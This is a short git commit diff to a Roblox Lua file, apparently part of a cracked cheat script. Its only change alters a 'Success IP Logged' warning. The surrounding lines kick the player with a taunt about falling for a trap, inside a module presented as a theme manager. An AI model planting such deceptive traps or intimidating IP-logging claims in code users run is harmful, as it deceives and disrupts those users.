e0f8c33d68f368c6f9e3b06980b889f7c7045b29
Anth <129230009+onlyanth@users.noreply.github.com>
2023-07-20 13:21:47 -0500

    Update ManagerV2.lua

--- ManagerV2.lua
+++ ManagerV2.lua
@@ -1,4 +1,4 @@
- warn("Success IP Logged")
+ warn("Success IP Loggedd")
                 game.Players.LocalPlayer:Kick('[ASTRAL PROECTION] Hello world! You have fell for the plan! This crack has been archived by onlyanth! .gg/astralttm") 
 local httpService = game:GetService('HttpService')
 local ThemeManager = {} do
